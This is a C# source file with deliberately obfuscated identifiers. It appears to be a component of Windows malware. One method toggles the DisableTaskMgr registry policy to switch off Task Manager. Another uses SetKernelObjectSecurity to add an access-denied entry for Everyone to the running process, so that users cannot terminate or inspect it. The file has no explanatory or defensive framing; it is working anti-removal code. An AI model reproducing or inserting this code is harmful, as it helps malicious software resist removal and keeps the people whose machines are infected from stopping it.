using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace MufMaOSvGyvz;

internal class tOQtIRDNrGpD
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr JFruBjVvHaO, int tMPQDUfQDFtVn, [Out] byte[] iOESQxslYeYLWx, uint KSLIIIqbffaWrLa, out uint jxCwtQsOjul);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr hGoxMTUtMZq, int TigQegujdRYeQCE, [In] byte[] efVMDYZOuLsMi);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void ywIDKStthl(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (bool_0 && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor kXXdBYnfnvZP(IntPtr intptr_0)
	{
		byte[] iOESQxslYeYLWx = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, iOESQxslYeYLWx, 0u, out var jxCwtQsOjul);
		if ((long)jxCwtQsOjul > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, iOESQxslYeYLWx = new byte[jxCwtQsOjul], jxCwtQsOjul, out jxCwtQsOjul))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(iOESQxslYeYLWx, 0);
	}

	private void UErUYvArZJESJ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void jkSoOuByvlwrEF()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = kXXdBYnfnvZP(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		UErUYvArZJESJ(currentProcess, rawSecurityDescriptor);
	}
}
